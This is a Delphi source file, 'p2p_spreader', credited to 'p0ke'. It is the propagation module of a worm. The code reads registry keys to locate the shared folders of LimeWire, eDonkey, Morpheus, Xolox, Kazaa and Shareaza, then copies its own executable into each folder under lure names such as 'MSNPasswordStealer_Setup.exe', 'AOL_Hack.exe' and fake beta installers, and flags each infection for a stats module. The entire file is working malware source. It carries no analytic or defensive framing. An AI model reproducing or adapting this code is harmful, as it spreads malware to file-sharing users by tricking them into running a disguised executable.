(* created by p0ke *)
unit p2p_spreader;

interface

{$DEFINE Stats}

uses
  Windows{$IFDEF Stats}, stats_spreader{$ENDIF};

  Procedure StartP2P;

implementation

Function GetReg(ROOT: HKEY; Path, Str: String): String;
Var
  Key: HKey;
  Siz: Cardinal;
  Val: Array[0..16382] Of Char;
Begin
  ZeroMemory(@Val, Length(Val));
Try
  RegOpenKeyEx(root, pChar(Path), 0, REG_SZ, Key);
  Siz := 16382;
  RegQueryValueEx(Key, pChar(Str), NIL, NIL, @Val[0], @Siz);
  RegCloseKey(Key);
  If Val <> '' Then Result := Val;
Except
  Exit;
End;
End;

Function FindEDonkey: Bool;
Begin
  Result := False;
  If GetReg(HKEY_LOCAL_MACHINE, 'Windows\CurrentVersion\Uninstall\eDonkey2000', 'UninstallString') <> '' Then Result := True;
End;

Function EDonkeyShare: String;
Var
  I: Word;
Begin
  Result := GetReg(HKEY_LOCAL_MACHINE, 'Windows\CurrentVersion\Uninstall\eDonkey2000', 'UninstallString');
  I := Pos('uninstall', Result);
  If I > 0 Then Result := Copy(Result, 2, I-2)+'\incoming';
  If Result[Length(Result)] <> '\' Then Result := Result + '\';
End;

Function FindMorpheus: Bool;
Begin
  Result := False;
  If GetReg(HKEY_LOCAL_MACHINE ,'\software\Morpheus', 'UninstallString') <> '' Then Result := True;
End;

Function MorhpeusShare: String;
Var
  i: Word;
Begin
  Result := GetReg(HKEY_LOCAL_MACHINE ,'\software\Morpheus', 'UninstallString');
  I := Pos('UNWISE.EXE', Result);
  If I > 0 Then Result := Copy(Result, 1, I-2) + '\My Shared Folder';
  If Result[Length(Result)] <> '\' Then Result := Result + '\';
End;

Function FindXolox: Bool;
Begin
  Result := False;
  If GetReg(HKEY_CURRENT_USER, '\software\Xolox', 'shareddirs') <> '' Then Result := True;
End;

Function XoloxShare: String;
Begin
  Result := GetReg(HKEY_CURRENT_USER, '\software\Xolox', 'shareddirs');
  If Result[Length(Result)] <> '\' Then Result := Result + '\';
End;

Function FindKazaa: Bool;
Begin
  Result := False;
  If GetReg(HKEY_CURRENT_USER, '\software\Kazaa', 'LocalContent') <> '' Then Result := True;
End;

Function KazaaShare: String;
Begin
  Result := GetReg(HKEY_CURRENT_USER, '\software\Kazaa', 'LocalContent');
  If Pos('012345:', Result) > 0 Then Result := Copy(Result, 7, Length(Result));
  If Result[Length(Result)] <> '\' Then Result := Result + '\';
End;

Function FindShareaza: Bool;
Begin
  Result := False;
  If GetReg(HKEY_CURRENT_USER, '\software\Shareaza', 'DownloadsPath') <> '' Then Result := True;
End;

Function ShareazaShare: String;
Begin
  Result := GetReg(HKEY_CURRENT_USER, '\software\Shareaza', 'DownloadsPath');
  If Result[Length(Result)] <> '\' Then Result := Result + '\';
End;

Function FindLimeWire: Bool;
Begin
  Result := False;
  If GetReg(HKEY_LOCAL_MACHINE, '\software\LimeWire', 'InstallDir') <> '' Then Result := True;
End;

Function LimeWireShare: String;
Begin
  Result := GetReg(HKEY_LOCAL_MACHINE, '\software\LimeWire', 'InstallDir');
  If Result[Length(Result)] <> '\' Then Result := Result + '\';
End;

function ExtractFileName(const Path: string): string;
var
  i, L: integer;
  Ch: Char;
begin
  L := Length(Path);
  for i := L downto 1 do
  begin
    Ch := Path[i];
    if (Ch = '\') or (Ch = '/') then
    begin
      Result := Copy(Path, i + 1, L - i);
      Break;
    end;
  end;
end;

Procedure ShareP2P(Name: String);
Begin
Try
  If FindLimeWire       Then Begin CopyFile(pChar(ParamStr(0)), pChar(LimeWireShare+ExtractFileName(Name)), False); {$IFDEF Stats} P2P_Infect := 'y'; {$ENDIF} End;
  If FindEDonkey        Then Begin CopyFile(pChar(ParamStr(0)), pChar(EDonkeyShare+ExtractFileName(Name)), False);  {$IFDEF Stats} P2P_Infect := 'y'; {$ENDIF} End;
  If FindMorpheus       Then Begin CopyFile(pChar(ParamStr(0)), pChar(MorhpeusShare+ExtractFileName(Name)), False); {$IFDEF Stats} P2P_Infect := 'y'; {$ENDIF} End;
  If FindXolox          Then Begin CopyFile(pChar(ParamStr(0)), pChar(XoloxShare+ExtractFileName(Name)), False);    {$IFDEF Stats} P2P_Infect := 'y'; {$ENDIF} End;
  If FindKazaa          Then Begin CopyFile(pChar(ParamStr(0)), pChar(KazaaShare+ExtractFileName(Name)), False);    {$IFDEF Stats} P2P_Infect := 'y'; {$ENDIF} End;
  If FindShareaza       Then Begin CopyFile(pChar(ParamStr(0)), pChar(ShareazaShare+ExtractFileName(Name)), False); {$IFDEF Stats} P2P_Infect := 'y'; {$ENDIF} End;
Except
  Exit;
End;
End;

Procedure StartP2P;
Const
  CopyName: Array[0..9] Of String = (
            'MSNPasswordStealer_Setup.exe', 'MSNHack.exe', 'AOL_Hack.exe', 'AOL_Password_Stealer.exe', 'mIRC 7.0 Beta.exe',
            'Setup.exe', 'MSNBot_Setup.exe', 'Winamp5.7Beta.exe', 'MSN7Beta.exe', 'ICQ2005.EXE'
            );
Var
  I: Integer;
Begin
  For I := 0 To 9 Do
    ShareP2P(CopyName[I]);
End;

end.
